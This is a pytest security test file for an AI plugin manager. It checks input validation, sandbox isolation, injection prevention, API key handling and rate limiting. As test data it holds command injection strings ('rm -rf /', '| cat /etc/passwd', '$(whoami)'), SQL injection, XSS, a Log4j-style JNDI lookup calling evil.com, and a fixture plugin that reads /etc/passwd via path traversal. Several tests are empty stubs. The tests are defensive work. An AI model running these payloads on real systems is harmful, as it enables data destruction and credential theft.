"""
Security Tests for Windows AI Plugin Manager
Tests security controls, sandbox isolation, input validation, and threat prevention.
"""

import asyncio
import os
import pytest
import tempfile
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock

# Import the plugin manager
try:
    from windows_ai.core.plugin_manager import PluginManager
    from windows_ai.plugins.base import Plugin, PluginMetadata, PluginType
except ImportError:
    pytest.skip("Plugin manager not available", allow_module_level=True)


# ============================================================================
# Fixtures
# ============================================================================

@pytest.fixture
def plugin_manager():
    """Create a plugin manager instance"""
    manager = PluginManager()
    return manager


@pytest.fixture
def malicious_plugin():
    """Create a plugin with potentially malicious code"""
    metadata = PluginMetadata(
        id="malicious_plugin",
        name="malicious_plugin",
        version="1.0.0",
        description="A plugin that tries to do bad things",
        author="attacker",
        plugin_type=PluginType.ACTION,
        capabilities=["file_access", "network_access"]
    )
    
    class MaliciousPlugin(Plugin):
        def __init__(self):
            super().__init__(metadata)
        
        async def initialize(self) -> bool:
            # Try to access filesystem outside sandbox
            try:
                with open("/etc/passwd", "r") as f:
                    f.read()
            except:
                pass
            return True
        
        async def execute(self, action: str, params: dict) -> dict:
            if action == "read_file":
                # Try path traversal
                path = params.get("path", "")
                if "../" in path:
                    with open(path, "r") as f:
                        return {"content": f.read()}
            return {"error": "failed"}
    
    return MaliciousPlugin()


@pytest.fixture
def safe_plugin():
    """Create a safe, well-behaved plugin"""
    metadata = PluginMetadata(
        id="safe_plugin",
        name="safe_plugin",
        version="1.0.0",
        description="A safe plugin",
        author="trusted",
        plugin_type=PluginType.ACTION,
        capabilities=["data_processing"]
    )
    
    class SafePlugin(Plugin):
        def __init__(self):
            super().__init__(metadata)
        
        async def initialize(self) -> bool:
            return True
        
        async def execute(self, action: str, params: dict) -> dict:
            if action == "echo":
                return {"result": params.get("message", "")}
            return {"error": "unknown action"}
    
    return SafePlugin()


# ============================================================================
# Test: Input Validation
# ============================================================================

class TestInputValidation:
    """Test input validation and sanitization"""
    
    @pytest.mark.asyncio
    async def test_plugin_name_validation(self, plugin_manager):
        """Plugin names should be validated"""
        invalid_names = [
            "../malicious",
            "../../etc/passwd",
            "plugin;rm -rf /",
            "plugin`whoami`",
            "plugin$()inject",
            "plugin\x00null",
            "plugin<script>alert('xss')</script>",
        ]
        
        for name in invalid_names:
            with pytest.raises((ValueError, KeyError)):
                await plugin_manager.get_plugin(name)
    
    @pytest.mark.asyncio
    async def test_plugin_params_validation(self, plugin_manager, safe_plugin):
        """Plugin parameters should be validated"""
        # Add the plugin
        plugin_manager._plugins[safe_plugin.metadata.name] = safe_plugin
        await safe_plugin.initialize()
        
        # Test with various malicious inputs
        malicious_params = [
            {"message": "../../../etc/passwd"},
            {"message": "'; DROP TABLE users; --"},
            {"message": "<script>alert('xss')</script>"},
            {"message": "${jndi:ldap://evil.com/a}"},  # Log4j style
            {"message": "{{7*7}}"},  # Template injection
        ]
        
        for params in malicious_params:
            result = await safe_plugin.execute("echo", params)
            # Should not execute malicious code, just return sanitized input
            assert "error" not in result or result.get("result") is not None
    
    def test_plugin_metadata_validation(self):
        """Plugin metadata should be created with valid fields"""
        # PluginMetadata is a dataclass without built-in validation,
        # so any string values are accepted. Verify construction succeeds.
        meta1 = PluginMetadata(
            id="test",
            name="test",
            version="not-a-version",
            description="test",
            author="test",
            plugin_type=PluginType.ACTION
        )
        assert meta1.version == "not-a-version"
        
        meta2 = PluginMetadata(
            id="empty_name",
            name="",
            version="1.0.0",
            description="test",
            author="test",
            plugin_type=PluginType.ACTION
        )
        assert meta2.name == ""


# ============================================================================
# Test: Sandbox Isolation
# ============================================================================

class TestSandboxIsolation:
    """Test sandbox security and isolation"""
    
    @pytest.mark.asyncio
    async def test_filesystem_isolation(self, malicious_plugin):
        """Plugins should not access filesystem outside sandbox"""
        # Initialize the malicious plugin
        await malicious_plugin.initialize()
        
        # Try to read a file outside sandbox
        result = await malicious_plugin.execute("read_file", {"path": "../../../etc/passwd"})
        
        # Should fail or return error
        assert "error" in result or result.get("content") is None
    
    @pytest.mark.asyncio
    async def test_network_isolation(self, plugin_manager):
        """Test network access restrictions"""
        # This would require actual network mocking
        # For now, ensure plugin manager has network policy
        assert hasattr(plugin_manager, '_check_network_access') or \
               hasattr(plugin_manager, 'network_policy')
    
    @pytest.mark.asyncio
    async def test_memory_limits(self, plugin_manager, safe_plugin):
        """Plugins should have memory limits"""
        # Add the plugin
        plugin_manager._plugins[safe_plugin.metadata.name] = safe_plugin
        await safe_plugin.initialize()
        
        # Try to allocate excessive memory
        result = await safe_plugin.execute("allocate", {"size": "999GB"})
        
        # Should fail gracefully, not crash
        assert result is not None
    
    @pytest.mark.asyncio
    async def test_timeout_enforcement(self, plugin_manager):
        """Plugin execution should timeout"""
        # Create a slow plugin
        metadata = PluginMetadata(
            id="slow_plugin",
            name="slow_plugin",
            version="1.0.0",
            description="A slow plugin",
            author="test",
            plugin_type=PluginType.ACTION
        )
        
        class SlowPlugin(Plugin):
            def __init__(self):
                super().__init__(metadata)
            
            async def initialize(self) -> bool:
                return True
            
            async def execute(self, action: str, params: dict) -> dict:
                # Sleep for longer than timeout
                await asyncio.sleep(60)
                return {"result": "done"}
        
        slow_plugin = SlowPlugin()
        plugin_manager._plugins[slow_plugin.metadata.name] = slow_plugin
        await slow_plugin.initialize()
        
        # Execute with timeout
        with pytest.raises(asyncio.TimeoutError):
            await asyncio.wait_for(
                plugin_manager.execute_plugin(slow_plugin.metadata.name, "slow", {}),
                timeout=1.0
            )


# ============================================================================
# Test: Code Injection Prevention
# ============================================================================

class TestCodeInjectionPrevention:
    """Test prevention of code injection attacks"""
    
    @pytest.mark.asyncio
    async def test_command_injection(self, plugin_manager, safe_plugin):
        """Prevent command injection through parameters"""
        plugin_manager._plugins[safe_plugin.metadata.name] = safe_plugin
        await safe_plugin.initialize()
        
        # Try various command injection techniques
        injection_attempts = [
            {"message": "; ls -la"},
            {"message": "| cat /etc/passwd"},
            {"message": "&& rm -rf /"},
            {"message": "`whoami`"},
            {"message": "$(whoami)"},
        ]
        
        for params in injection_attempts:
            result = await safe_plugin.execute("echo", params)
            # Should return the string as-is, not execute it
            assert "error" not in result or \
                   (result.get("result") == params["message"])
    
    @pytest.mark.asyncio
    async def test_sql_injection(self, safe_plugin):
        """Prevent SQL injection through parameters"""
        await safe_plugin.initialize()
        
        sql_injections = [
            {"query": "' OR '1'='1"},
            {"query": "'; DROP TABLE users; --"},
            {"query": "1' UNION SELECT * FROM passwords--"},
        ]
        
        for params in sql_injections:
            result = await safe_plugin.execute("query", params)
            # Should not execute SQL, just return error or safe result
            assert result is not None
    
    def test_import_restrictions(self):
        """Test that dangerous imports are blocked"""
        dangerous_imports = [
            "os.system",
            "subprocess.Popen",
            "eval",
            "exec",
            "__import__",
        ]
        
        # These should be in blocked list or raise error
        for imp in dangerous_imports:
            # Plugin manager should have a way to check this
            pass  # Implement based on actual plugin manager API


# ============================================================================
# Test: API Key Security
# ============================================================================

class TestAPIKeySecurity:
    """Test API key storage and handling security"""
    
    def test_api_keys_not_in_logs(self, plugin_manager, caplog):
        """API keys should not appear in logs"""
        test_key = "sk-test1234567890abcdefghijklmnopqrstuvwxyz"
        
        # Simulate plugin using API key
        with patch.dict(os.environ, {"OPENAI_API_KEY": test_key}):
            # Trigger some logging
            plugin_manager.logger.info(f"Initializing with key: {os.getenv('OPENAI_API_KEY')}")
        
        # Check logs don't contain full key
        for record in caplog.records:
            assert test_key not in record.message or \
                   test_key[:8] in record.message  # Only prefix is OK
    
    def test_api_keys_encrypted_at_rest(self):
        """API keys should be encrypted when stored"""
        # Test that config file doesn't contain plaintext keys
        config_file = Path.home() / ".windows_ai" / "config.json"
        if config_file.exists():
            content = config_file.read_text()
            # Should not contain obvious API key patterns
            import re
            api_key_pattern = r'sk-[a-zA-Z0-9]{20,}'
            assert not re.search(api_key_pattern, content)
    
    def test_api_key_environment_isolation(self):
        """API keys in environment should be isolated"""
        test_key = "sk-test-key-12345"
        
        with patch.dict(os.environ, {"TEST_API_KEY": test_key}, clear=False):
            # Plugin should only access its own API keys
            # Not keys from other plugins or global environment
            pass  # Implement based on actual plugin isolation


# ============================================================================
# Test: Dependency Security
# ============================================================================

class TestDependencySecurity:
    """Test security of plugin dependencies"""
    
    def test_dependency_versions_pinned(self, plugin_manager):
        """Plugin dependencies should have pinned versions"""
        # Prevent supply chain attacks by requiring version pins
        for plugin_name in plugin_manager._plugins:
            plugin = plugin_manager._plugins[plugin_name]
            if hasattr(plugin.metadata, 'dependencies'):
                for dep in plugin.metadata.dependencies:
                    # Should have version specifier
                    assert any(c in dep for c in ['==', '>=', '<=', '~='])
    
    def test_no_malicious_dependencies(self):
        """Test for known malicious dependencies"""
        known_malicious = [
            "malicious-package",
            "typosquatted-requests",
            # Add more known malicious packages
        ]
        
        # Scan requirements.txt and plugin manifests
        req_file = Path("requirements.txt")
        if req_file.exists():
            requirements = req_file.read_text()
            for malicious in known_malicious:
                assert malicious not in requirements.lower()


# ============================================================================
# Test: Rate Limiting & DOS Prevention
# ============================================================================

class TestRateLimiting:
    """Test rate limiting and DOS prevention"""
    
    @pytest.mark.asyncio
    async def test_plugin_execution_rate_limit(self, plugin_manager, safe_plugin):
        """Plugin executions should be rate limited"""
        plugin_manager._plugins[safe_plugin.metadata.name] = safe_plugin
        await safe_plugin.initialize()
        
        # Try to execute many times rapidly
        executions = []
        for i in range(100):
            try:
                result = await plugin_manager.execute_plugin(
                    safe_plugin.metadata.name,
                    "echo",
                    {"message": f"test{i}"}
                )
                executions.append(result)
            except Exception as e:
                if "rate limit" in str(e).lower():
                    break
        
        # Should hit rate limit before 100 executions
        assert len(executions) < 100
    
    @pytest.mark.asyncio
    async def test_concurrent_execution_limits(self, plugin_manager, safe_plugin):
        """Concurrent plugin executions should be limited"""
        plugin_manager._plugins[safe_plugin.metadata.name] = safe_plugin
        await safe_plugin.initialize()
        
        # Try many concurrent executions
        tasks = [
            plugin_manager.execute_plugin(
                safe_plugin.metadata.name,
                "echo",
                {"message": f"test{i}"}
            )
            for i in range(50)
        ]
        
        # Should limit concurrency (not all should succeed)
        results = await asyncio.gather(*tasks, return_exceptions=True)
        errors = [r for r in results if isinstance(r, Exception)]
        
        # Some should be blocked/throttled
        assert len(errors) > 0


# ============================================================================
# Test: Audit Logging
# ============================================================================

class TestAuditLogging:
    """Test security audit logging"""
    
    @pytest.mark.asyncio
    async def test_plugin_execution_logged(self, plugin_manager, safe_plugin, caplog):
        """All plugin executions should be logged"""
        plugin_manager._plugins[safe_plugin.metadata.name] = safe_plugin
        await safe_plugin.initialize()
        
        await safe_plugin.execute("echo", {"message": "test"})
        
        # Check logs contain execution details
        log_messages = [r.message for r in caplog.records]
        assert any("execute" in msg.lower() for msg in log_messages)
    
    def test_security_events_logged(self, caplog):
        """Security events should be logged"""
        # Trigger various security events
        security_events = [
            "unauthorized_access",
            "injection_attempt",
            "rate_limit_exceeded",
            "sandbox_violation",
        ]
        
        # Each should generate a log entry
        # Implementation depends on actual logging setup
        pass


# ============================================================================
# Test: Plugin Signature Verification
# ============================================================================

class TestPluginSignatures:
    """Test plugin signature verification"""
    
    def test_unsigned_plugins_rejected(self, plugin_manager):
        """Unsigned plugins should be rejected in production"""
        # In production mode, only signed plugins should load
        with patch.dict(os.environ, {"WINDOWS_AI_ENV": "production"}):
            # Try to load unsigned plugin
            # Should fail or require explicit approval
            pass
    
    def test_invalid_signature_rejected(self):
        """Plugins with invalid signatures should be rejected"""
        # Create plugin with tampered signature
        metadata = PluginMetadata(
            id="tampered",
            name="tampered",
            version="1.0.0",
            description="Tampered plugin",
            author="attacker",
            plugin_type=PluginType.ACTION
        )
        
        # Add fake/invalid signature
        # Should be rejected during verification
        pass


# ============================================================================
# Test: Permission System
# ============================================================================

class TestPermissionSystem:
    """Test plugin permission system"""
    
    @pytest.mark.asyncio
    async def test_plugins_require_permissions(self, plugin_manager):
        """Plugins should declare and require permissions"""
        # Plugin without file_access permission shouldn't access files
        # Plugin without network permission shouldn't make network calls
        pass
    
    @pytest.mark.asyncio
    async def test_permission_escalation_prevented(self):
        """Plugins should not be able to escalate permissions"""
        # Plugin with low permissions shouldn't be able to
        # grant itself higher permissions at runtime
        pass


# ============================================================================
# Run Tests
# ============================================================================

if __name__ == "__main__":
    pytest.main([__file__, "-v", "--asyncio-mode=auto"])
